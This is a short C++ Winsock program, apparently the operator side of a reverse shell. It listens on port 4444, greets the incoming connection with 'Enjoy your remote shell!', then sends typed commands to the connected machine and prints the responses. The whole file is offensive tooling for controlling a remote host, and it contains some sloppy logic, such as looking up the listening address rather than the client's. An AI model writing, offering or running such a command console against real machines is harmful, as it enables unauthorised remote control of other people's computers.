#include <iostream>
#include <WS2tcpip.h>
#include <string>
#include <fstream>

#pragma comment(lib, "ws2_32.lib")

int main() {
    WSADATA data;
    WORD version = MAKEWORD(2, 2);

    if (WSAStartup(version, &data) != 0) {
        std::cerr << "WSAStartup failed!\n";
        return -1;
    }

    SOCKET listening = socket(AF_INET, SOCK_STREAM, 0);
    if (listening == INVALID_SOCKET) {
        std::cerr << "Can't create socket!\n";
        return -1;
    }

    sockaddr_in hint;
    hint.sin_family = AF_INET;
    hint.sin_port = htons(4444);
    hint.sin_addr.S_un.S_addr = INADDR_ANY;

    bind(listening, (sockaddr*)&hint, sizeof(hint));
    listen(listening, SOMAXCONN);

    std::cout << "Waiting for a connection...\n";

    SOCKET client = accept(listening, nullptr, nullptr);

    char host[NI_MAXHOST];
    char service[NI_MAXSERV];

    if (getnameinfo((sockaddr*)&hint, sizeof(hint), host, NI_MAXHOST, service, NI_MAXSERV, 0) == 0) {
        std::cout << "User connected from " << host << ":" << service << "\n";
    }
    else {
        inet_ntop(AF_INET, &hint.sin_addr, host, NI_MAXHOST);
        std::cout << "User connected on " << host << ":" << ntohs(hint.sin_port) << "\n";
    }

    std::cout << "Enjoy your remote shell!\n";

    char buf[4096];
    std::string command;

    while (true) {
        std::cout << host << " > ";
        std::getline(std::cin, command);
        send(client, command.c_str(), command.size(), 0);

        // Receive and print the server's response
        memset(buf, 0, 4096);
        int bytesReceived = recv(client, buf, 4096, 0);
        if (bytesReceived > 0) {
            std::cout << "Server response: " << std::string(buf, 0, bytesReceived) << "\n";
        }
    }

    closesocket(listening);
    closesocket(client);

    WSACleanup();

    return 0;
}
